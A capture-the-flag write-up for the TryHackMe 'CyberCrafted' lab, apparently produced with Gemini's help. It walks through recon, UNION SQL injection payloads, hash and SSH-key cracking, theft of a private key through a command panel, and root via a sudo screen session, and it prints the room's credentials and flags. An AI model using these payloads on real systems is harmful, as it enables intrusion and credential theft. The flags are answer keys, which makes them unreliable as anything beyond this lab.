# CyberCrafted - TryHackMe Writeup
*(solved by gemini 🤖🤖🤖)*
## 1. Reconnaissance
We start by performing a full port scan on the target IP using Nmap.

```bash
nmap -p- --min-rate=1000 -T4 10.49.129.75 -oN nmap_all_ports.txt
nmap -p 22,80,25565 -sC -sV 10.49.129.75 -oN nmap_details.txt
```

Nmap reveals 3 open ports:
* **22/tcp**: OpenSSH 7.6p1
* **80/tcp**: Apache httpd 2.4.29
* **25565/tcp**: Minecraft 1.7.2

Navigating to the web server on port 80 redirects us to `http://cybercrafted.thm/`. We need to add this domain to our `/etc/hosts` file to resolve it correctly.

```bash
echo "10.49.129.75 cybercrafted.thm" | sudo tee -a /etc/hosts
```

Next, we fuzz for subdomains using `ffuf` and the `subdomains-top1million-5000.txt` wordlist.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.49.129.75 -H "Host: FUZZ.cybercrafted.thm" -ac
```
We discover the `admin` and `store` subdomains. Let's append them to our `/etc/hosts` entry.

```bash
sudo sed -i 's/10.49.129.75 cybercrafted.thm/10.49.129.75 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm/' /etc/hosts
```

## 2. Web Enumeration
* `admin.cybercrafted.thm` presents an admin login portal.
* `store.cybercrafted.thm` returns a 403 Forbidden error on the root page. Directory fuzzing on the store subdomain reveals a `search.php` page.

```bash
ffuf -u http://10.49.129.75/FUZZ -H "Host: store.cybercrafted.thm" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.bak -ac
```

## 3. Exploitation (SQL Injection)
Navigating to `http://store.cybercrafted.thm/search.php`, we find a search form that queries a database of in-game items. By testing the input `search=' order by 4-- -&submit=`, we determine the query returns 3 columns, and the application is vulnerable to SQL injection.

We can exploit this using a UNION-based SQL injection to enumerate the database:
```bash
# List databases
curl -s -X POST http://10.49.129.75/search.php -H "Host: store.cybercrafted.thm" -d "search=' union select 1,schema_name,3,4 from information_schema.schemata-- -&submit="

# List tables in the 'webapp' database
curl -s -X POST http://10.49.129.75/search.php -H "Host: store.cybercrafted.thm" -d "search=' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='webapp'-- -&submit="

# Dump data from the 'admin' table
curl -s -X POST http://10.49.129.75/search.php -H "Host: store.cybercrafted.thm" -d "search=' union select 1,user,hash,4 from admin-- -&submit="
```
Dumping the `admin` table reveals the admin user `xXUltimateCreeperXx` and their SHA1 hash `88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01`, as well as a fake user `web_flag` containing the first flag: `THM{bbe315906038c3a62d9b195001f75008}`.

We crack the hash using John The Ripper:
```bash
echo "88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01" > admin_hash.txt
john --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt
```
The cracked password is `diamond123456789`.

## 4. Initial Access & Command Execution
Logging into `admin.cybercrafted.thm` with the credentials `xXUltimateCreeperXx` : `diamond123456789` grants us access to a command execution panel (`panel.php`). Running `id` confirms it executes commands as the `www-data` user.

We use this command execution to explore the file system and extract the SSH private key for `xxultimatecreeperxx`:
```bash
curl -s -X POST http://10.49.129.75/panel.php -H "Host: admin.cybercrafted.thm" -H "Cookie: PHPSESSID=..." -d "command=cat /home/xxultimatecreeperxx/.ssh/id_rsa&submit="
```

The extracted SSH key is encrypted. We use `ssh2john` and John the Ripper to crack the passphrase.
```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
The passphrase is `creepin2006`.

## 5. Privilege Escalation to User (cybercrafted)
We log in via SSH as `xxultimatecreeperxx`:
```bash
ssh -i id_rsa xxultimatecreeperxx@10.49.129.75
```
This user belongs to the `minecraft` group. We explore the server directory `/opt/minecraft` and find the `minecraft_server_flag.txt`.
```bash
cat /opt/minecraft/minecraft_server_flag.txt
# THM{ba93767ae3db9f5b8399680040a0c99e}
```

Looking through the Minecraft plugins in `/opt/minecraft/cybercrafted/plugins`, we find a custom `LoginSystem` plugin. Reading its logs reveals plaintext passwords for players logging in:
```bash
cat /opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
# [2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
```

We switch to the system user `cybercrafted` using the discovered password `JavaEdition>Bedrock` and read the user flag:
```bash
su - cybercrafted
cat /home/cybercrafted/user.txt
# THM{b4aa20aaf08f174473ab0325b24a45ca}
```

## 6. Privilege Escalation to Root
Checking `sudo -l` for `cybercrafted` shows the following entry:
```
User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```
This means the `cybercrafted` user can attach to a detached `screen` session owned by root, which is running the Minecraft server console.

We attach to the session:
```bash
sudo /usr/bin/screen -r cybercrafted
```

Once attached to the screen session, we can utilize `screen`'s built-in command execution feature to run arbitrary commands as the user running the session (root). 
We press `Ctrl+A` to enter command mode, then type `:exec` followed by our command to dump the root flag into a world-readable location:
```bash
[Ctrl+A]
:exec cat /root/root.txt > /tmp/root_flag.txt
```
Alternatively, one could execute `:exec sh -c "cat /root/root.txt > /tmp/root_flag.txt"`.

Finally, we exit the screen session and read the flag:
```bash
cat /tmp/root_flag.txt
# THM{8bb1eda065ceefb5795a245568350a70}
```
System rooted!
